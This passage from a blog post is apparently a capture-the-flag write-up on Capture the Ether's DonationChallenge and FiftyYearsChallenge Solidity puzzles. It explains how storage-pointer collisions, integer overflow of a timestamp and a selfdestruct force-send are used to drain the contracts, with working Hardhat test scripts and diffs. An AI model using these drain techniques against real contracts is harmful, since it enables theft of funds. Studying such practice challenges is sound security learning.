</span></span></code><!--]--></pre></div></div><p><!--[-->What we need to do here to successfully drain the contract, is overwrite the <code class=""><!--[-->owner<!--]--></code> variable. If you compile this contract, you&#39;ll see the following warning:<!--]--></p><div><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate"></div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code>Warning: Variable is declared as a storage pointer. Use an explicit &quot;storage&quot; keyword to silence this warning.
</code><!--]--></pre></div></div><p><!--[--><code class=""><!--[-->Variable declared as a storage pointer<!--]--></code> means that rather than assigning values to the attributes of a new and empty instance of <code class=""><!--[-->Donation<!--]--></code>, when this struct is assigned to, its slots are actually overwriting the contract&#39;s own storage slots! So <code class=""><!--[-->donation.timestamp<!--]--></code> overwrites <code class=""><!--[-->donations.length<!--]--></code> (stored in slot 0, as we explored in the previous test), and <code class=""><!--[-->donation.etherAmount<!--]--></code> overwrites <code class=""><!--[-->owner<!--]--></code>... There&#39;s our route in. Now, how to exploit it?<!--]--></p><p><!--[-->We have a barrier to calling the <code class=""><!--[-->donate<!--]--></code>; it has a requirement, which is quite frankly, totally bat-shit insane. This has fairly clearly been contrived as such to enormously simplify exploiting the contract&#39;s vulerability. <code class=""><!--[-->uint256 scale = 10**18 * 1 ether;<!--]--></code> - this states that the scale is 10**36, twice the number of decimals that Ethereum has, meaning that while we do need to match the input (we will supply the player&#39;s account ID as <code class=""><!--[-->etherAmount<!--]--></code>) with a quantity of Wei, the amount of Ropsten ETH that we need to send is pretty small. The amount we need to send is <code class=""><!--[-->playerAddress / 10**36<!--]--></code>.<!--]--></p><p><!--[-->Knowing both of these elements of the exploit, we can write our test:<!--]--></p><div language="typescript" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">test/math/donation-challenge.ts</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-typescript shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { expect } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;chai&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { ethers } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;hardhat&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="3"><span emptylineplaceholder="true">
</span></span><span class="line" line="4"><span style="--shiki-default:#B392F0">describe</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;DonationChallenge&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0">  it</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;should return true if we empty the campaign contributions&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">async</span><span style="--shiki-default:#F97583"> function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="6"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#E1E4E8"> [, </span><span style="--shiki-default:#79B8FF">player</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getSigners</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="7"><span emptylineplaceholder="true">
</span></span><span class="line" line="8"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> Challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getContractFactory</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;DonationChallenge&quot;</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="9"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> Challenge.</span><span style="--shiki-default:#B392F0">deploy</span><span style="--shiki-default:#E1E4E8">({
</span></span><span class="line" line="10"><span style="--shiki-default:#E1E4E8">      value: ethers.utils.</span><span style="--shiki-default:#B392F0">parseEther</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;1&quot;</span><span style="--shiki-default:#E1E4E8">),
</span></span><span class="line" line="11"><span style="--shiki-default:#E1E4E8">    });
</span></span><span class="line" line="12"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">deployed</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="13"><span emptylineplaceholder="true">
</span></span><span class="line" line="14"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">donate</span><span style="--shiki-default:#E1E4E8">(player.address, {
</span></span><span class="line" line="15"><span style="--shiki-default:#E1E4E8">      value: ethers.BigNumber.</span><span style="--shiki-default:#B392F0">from</span><span style="--shiki-default:#E1E4E8">(player.address).</span><span style="--shiki-default:#B392F0">div</span><span style="--shiki-default:#E1E4E8">(
</span></span><span class="line" line="16"><span style="--shiki-default:#E1E4E8">        ethers.BigNumber.</span><span style="--shiki-default:#B392F0">from</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">10</span><span style="--shiki-default:#E1E4E8">).</span><span style="--shiki-default:#B392F0">pow</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">36</span><span style="--shiki-default:#E1E4E8">)
</span></span><span class="line" line="17"><span style="--shiki-default:#E1E4E8">      ),
</span></span><span class="line" line="18"><span style="--shiki-default:#E1E4E8">    });
</span></span><span class="line" line="19"><span emptylineplaceholder="true">
</span></span><span class="line" line="20"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> withdrawTx</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">connect</span><span style="--shiki-default:#E1E4E8">(player).</span><span style="--shiki-default:#B392F0">withdraw</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="21"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> withdrawTx.</span><span style="--shiki-default:#B392F0">wait</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="22"><span emptylineplaceholder="true">
</span></span><span class="line" line="23"><span style="--shiki-default:#B392F0">    expect</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#F97583">await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">isComplete</span><span style="--shiki-default:#E1E4E8">()).to.</span><span style="--shiki-default:#B392F0">equal</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">true</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="24"><span style="--shiki-default:#E1E4E8">  });
</span></span><span class="line" line="25"><span style="--shiki-default:#E1E4E8">});
</span></span></code><!--]--></pre></div></div><p><!--[-->Here, we implement the logic we figured out above, and automate the end-to-end exploit and withdrawal process. Another pass! Only one challenge left - the most interesting and most valuable one yet, worth 2000 points!<!--]--></p><h3 id="fiftyyearschallenge"><a href="#fiftyyearschallenge"><!--[-->FiftyYearsChallenge<!--]--></a></h3><p><!--[-->This challenge requires that we use a variety of tricks that we&#39;ve learned over the previous exercises in the Math section to exploit it. Some in exactly the way we&#39;ve used them before, others in a new and interesting way. There are in total 3 steps to fully completing this challenge in the way that I&#39;ve done. There are other ways to do so, but this is the shortest method that I know of.<!--]--></p><p><!--[-->If we have a look through the contract, we will see that the main thing we need to do, is figure out a way to call the <code class=""><!--[-->withdraw<!--]--></code> method. In order to do this, we need to somehow make sure that the <code class=""><!--[-->unlockTimestamp<!--]--></code> on the queue item that we are requesting withdrawal of is set to a UNIX timestamp before now, and also ensure that the donations previous to and including the index we are withdrawing, add up to exactly the balance of the contract.<!--]--></p><p><!--[-->Ok, so let&#39;s first focus on figuring out how to sort the <code class=""><!--[-->unlockTimestamp<!--]--></code> issue. Looking at the <code class=""><!--[-->upsert<!--]--></code> method, we can see that in the <code class=""><!--[-->else<!--]--></code> part of the conditional, <code class=""><!--[-->contribution<!--]--></code> is never directly defined, which in this case means that it ends up being both a storage pointer, <em><!--[-->and<!--]--></em> being pushed onto the queue as a new Contribution. so we can use this to overwrite our <code class=""><!--[-->queue.length<!--]--></code> and <code class=""><!--[-->head<!--]--></code>, respectively for <code class=""><!--[-->msg.value<!--]--></code> and <code class=""><!--[-->timestamp<!--]--></code>. The number of Wei we send ends up being written directly into <code class=""><!--[-->queue.length<!--]--></code>, and the timestamp ends up overwriting <code class=""><!--[-->head<!--]--></code>. We need to remember this last point, as <code class=""><!--[-->head<!--]--></code> needs to be set to the correct value to allow us to withdraw.<!--]--></p><p><!--[-->In order to get that far, though, we have to first work out how to access this part of the code. The requirement is that the timestamp is greater than or equal to the timestamp of the last item in the queue. We already know we can control <code class=""><!--[-->queue.length<!--]--></code>, so that is something we can exploit. The other thing we notice is that there is no bounds checking on the timestamp or unlockTimestamp of the last queue item - so we can quite feasibly overflow that back to 0. Let&#39;s start putting together our test and see where we get.<!--]--></p><div language="typescript" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">test/math/fifty-years-challenge.ts</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-typescript shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { expect } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;chai&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span style="--shiki-default:#F97583">import</span><span style="--shiki-default:#E1E4E8"> { ethers } </span><span style="--shiki-default:#F97583">from</span><span style="--shiki-default:#9ECBFF"> &quot;hardhat&quot;</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="3"><span emptylineplaceholder="true">
</span></span><span class="line" line="4"><span style="--shiki-default:#B392F0">describe</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;FiftyYearsChallenge&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0">  it</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;should return true if we empty the smart contract&quot;</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#F97583">async</span><span style="--shiki-default:#F97583"> function</span><span style="--shiki-default:#E1E4E8"> () {
</span></span><span class="line" line="6"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#E1E4E8"> [, </span><span style="--shiki-default:#79B8FF">player</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getSigners</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="7"><span emptylineplaceholder="true">
</span></span><span class="line" line="8"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> Challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> ethers.</span><span style="--shiki-default:#B392F0">getContractFactory</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;FiftyYearsChallenge&quot;</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="9"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> challengeDeploy</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> Challenge.</span><span style="--shiki-default:#B392F0">deploy</span><span style="--shiki-default:#E1E4E8">(player.address, {
</span></span><span class="line" line="10"><span style="--shiki-default:#E1E4E8">      value: ethers.utils.</span><span style="--shiki-default:#B392F0">parseEther</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#9ECBFF">&quot;1&quot;</span><span style="--shiki-default:#E1E4E8">),
</span></span><span class="line" line="11"><span style="--shiki-default:#E1E4E8">    });
</span></span><span class="line" line="12"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> challengeDeploy.</span><span style="--shiki-default:#B392F0">deployed</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="13"><span emptylineplaceholder="true">
</span></span><span class="line" line="14"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> challenge</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#E1E4E8"> challengeDeploy.</span><span style="--shiki-default:#B392F0">connect</span><span style="--shiki-default:#E1E4E8">(player);
</span></span><span class="line" line="15"><span emptylineplaceholder="true">
</span></span><span class="line" line="16"><span style="--shiki-default:#6A737D">    // Add a new Contribution that allows us to overflow `unlockTimestamp` to 0
</span></span><span class="line" line="17"><span style="--shiki-default:#F97583">    const</span><span style="--shiki-default:#79B8FF"> upsertTx</span><span style="--shiki-default:#F97583"> =</span><span style="--shiki-default:#F97583"> await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">upsert</span><span style="--shiki-default:#E1E4E8">(
</span></span><span class="line" line="18"><span style="--shiki-default:#79B8FF">      1</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#6A737D">// Insert at queue position 1
</span></span><span class="line" line="19"><span style="--shiki-default:#E1E4E8">      ethers.constants.MaxUint256.</span><span style="--shiki-default:#B392F0">sub</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">86400</span><span style="--shiki-default:#F97583"> -</span><span style="--shiki-default:#79B8FF"> 1</span><span style="--shiki-default:#E1E4E8">),
</span></span><span class="line" line="20"><span style="--shiki-default:#E1E4E8">      {
</span></span><span class="line" line="21"><span style="--shiki-default:#E1E4E8">        value: </span><span style="--shiki-default:#79B8FF">1</span><span style="--shiki-default:#E1E4E8">, </span><span style="--shiki-default:#6A737D">// Ensure `queue.length` is 1 before we push
</span></span><span class="line" line="22"><span style="--shiki-default:#E1E4E8">      }
</span></span><span class="line" line="23"><span style="--shiki-default:#E1E4E8">    );
</span></span><span class="line" line="24"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> upsertTx.</span><span style="--shiki-default:#B392F0">wait</span><span style="--shiki-default:#E1E4E8">();
</span></span><span class="line" line="25"><span emptylineplaceholder="true">
</span></span><span class="line" line="26"><span style="--shiki-default:#F97583">    await</span><span style="--shiki-default:#E1E4E8"> challenge.</span><span style="--shiki-default:#B392F0">withdraw</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">1</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="27"><span emptylineplaceholder="true">
</span></span><span class="line" line="28"><span style="--shiki-default:#B392F0">    expect</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#F97583">await</span><span style="--shiki-default:#E1E4E8"> challengeDeploy.</span><span style="--shiki-default:#B392F0">isComplete</span><span style="--shiki-default:#E1E4E8">()).to.</span><span style="--shiki-default:#B392F0">equal</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">true</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="29"><span style="--shiki-default:#E1E4E8">  });
</span></span><span class="line" line="30"><span style="--shiki-default:#E1E4E8">});
</span></span></code><!--]--></pre></div></div><p><!--[-->What we have so far is an upsert operation which sets our last queue item&#39;s unlockTimestamp that will overflow back to 0 when we insert another Contribution, but also makes sure that we maintain continuity of <code class=""><!--[-->queue.length<!--]--></code> so that we push a new queue item directly after the existing one. We have at this point overwritten <code class=""><!--[-->head<!--]--></code> with an absurdly high number, which we will fix in the next part of the test.<!--]--></p><div language="diff" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate"></div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-diff shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#79B8FF">diff --git a/test/math/fifty-years-challenge.ts b/test/math/fifty-years-challenge.ts
</span></span><span class="line" line="2"><span style="--shiki-default:#E1E4E8">index ff698ba..decc6cb 100644
</span></span><span class="line" line="3"><span style="--shiki-default:#FDAEB7">--- a/test/math/fifty-years-challenge.ts
</span></span><span class="line" line="4"><span style="--shiki-default:#85E89D">+++ b/test/math/fifty-years-challenge.ts
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0;--shiki-default-font-weight:bold">@@ -14,14 +14,20 @@</span><span style="--shiki-default:#E1E4E8"> describe(&quot;FiftyYearsChallenge&quot;, function () {
</span></span><span class="line" line="6"><span style="--shiki-default:#E1E4E8">     const challenge = challengeDeploy.connect(player);
</span></span><span class="line" line="7"><span emptylineplaceholder="true">
</span></span><span class="line" line="8"><span style="--shiki-default:#E1E4E8">     // Add a new Contribution that allows us to overflow `unlockTimestamp` to 0
</span></span><span class="line" line="9"><span style="--shiki-default:#FDAEB7">-    const upsertTx = await challenge.upsert(
</span></span><span class="line" line="10"><span style="--shiki-default:#85E89D">+    const upsertTx1 = await challenge.upsert(
</span></span><span class="line" line="11"><span style="--shiki-default:#E1E4E8">       1, // Insert at queue position 1
</span></span><span class="line" line="12"><span style="--shiki-default:#E1E4E8">       ethers.constants.MaxUint256.sub(86400 - 1),
</span></span><span class="line" line="13"><span style="--shiki-default:#E1E4E8">       {
</span></span><span class="line" line="14"><span style="--shiki-default:#E1E4E8">         value: 1, // Ensure `queue.length` is 1 before we push
</span></span><span class="line" line="15"><span style="--shiki-default:#E1E4E8">       }
</span></span><span class="line" line="16"><span style="--shiki-default:#E1E4E8">     );
</span></span><span class="line" line="17"><span style="--shiki-default:#FDAEB7">-    await upsertTx.wait();
</span></span><span class="line" line="18"><span style="--shiki-default:#85E89D">+    await upsertTx1.wait();
</span></span><span class="line" line="19"><span style="--shiki-default:#85E89D">+
</span></span><span class="line" line="20"><span style="--shiki-default:#85E89D">+    // Add a new contribution with a timestamp before today
</span></span><span class="line" line="21"><span style="--shiki-default:#85E89D">+    const upsertTx2 = await challenge.upsert(2, 0, {
</span></span><span class="line" line="22"><span style="--shiki-default:#85E89D">+      value: 2, // Set `queue.length` to 2
</span></span><span class="line" line="23"><span style="--shiki-default:#85E89D">+    });
</span></span><span class="line" line="24"><span style="--shiki-default:#85E89D">+    await upsertTx2.wait();
</span></span><span class="line" line="25"><span emptylineplaceholder="true">
</span></span><span class="line" line="26"><span style="--shiki-default:#E1E4E8">     await challenge.withdraw(2);
</span></span></code><!--]--></pre></div></div><p><!--[-->Ok - so we&#39;ve now inserted a new item in there with a timestamp before today! Surely this will let us withdraw now? Not yet - the contract currently contains 2 Wei less than the calculated <code class=""><!--[-->total<!--]--></code>. To solve this, let&#39;s reuse something we wrote earlier - when we needed to force some Ethereum into a contract, we used our trusty <code class=""><!--[-->selfdestruct<!--]--></code> contract. Because we wrote that to take an arbitrary target address and an arbitrary amount, we should be able to use that to force 2 wei into the contract without affecting its internal state:<!--]--></p><div language="diff" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate"></div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-diff shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#79B8FF">diff --git a/test/math/fifty-years-challenge.ts b/test/math/fifty-years-challenge.ts
</span></span><span class="line" line="2"><span style="--shiki-default:#E1E4E8">index decc6cb..d7ac559 100644
</span></span><span class="line" line="3"><span style="--shiki-default:#FDAEB7">--- a/test/math/fifty-years-challenge.ts
</span></span><span class="line" line="4"><span style="--shiki-default:#85E89D">+++ b/test/math/fifty-years-challenge.ts
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0;--shiki-default-font-weight:bold">@@ -29,6 +29,13 @@</span><span style="--shiki-default:#E1E4E8"> describe(&quot;FiftyYearsChallenge&quot;, function () {
</span></span><span class="line" line="6"><span style="--shiki-default:#E1E4E8">     });
</span></span><span class="line" line="7"><span style="--shiki-default:#E1E4E8">     await upsertTx2.wait();
</span></span><span class="line" line="8"><span emptylineplaceholder="true">
</span></span><span class="line" line="9"><span style="--shiki-default:#85E89D">+    // Force 2 wei into the contract without affecting the stored data
</span></span><span class="line" line="10"><span style="--shiki-default:#85E89D">+    const Solver = await ethers.getContractFactory(&quot;RetirementFundSolver&quot;);
</span></span><span class="line" line="11"><span style="--shiki-default:#85E89D">+    const solver = await Solver.deploy();
</span></span><span class="line" line="12"><span style="--shiki-default:#85E89D">+    await solver.die(challenge.address, {
</span></span><span class="line" line="13"><span style="--shiki-default:#85E89D">+      value: 2,
</span></span><span class="line" line="14"><span style="--shiki-default:#85E89D">+    });
</span></span><span class="line" line="15"><span style="--shiki-default:#85E89D">+
</span></span><span class="line" line="16"><span style="--shiki-default:#E1E4E8">     await challenge.withdraw(2);
</span></span><span class="line" line="17"><span emptylineplaceholder="true">
</span></span><span class="line" line="18"><span style="--shiki-default:#E1E4E8">     expect(await challengeDeploy.isComplete()).to.equal(true);
</span></span></code><!--]--></pre></div></div><p><!--[-->And boom - success! We&#39;ve done it again! We&#39;re done with all the Math challenges. We&#39;ll be back next time to smash our way through the Accounts challenges.<!--]--></p><style>html .default .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}</style></div><!--]--></div></article></section></div></div></main></div><!--]--></div></div><div id="teleports"></div></body></html>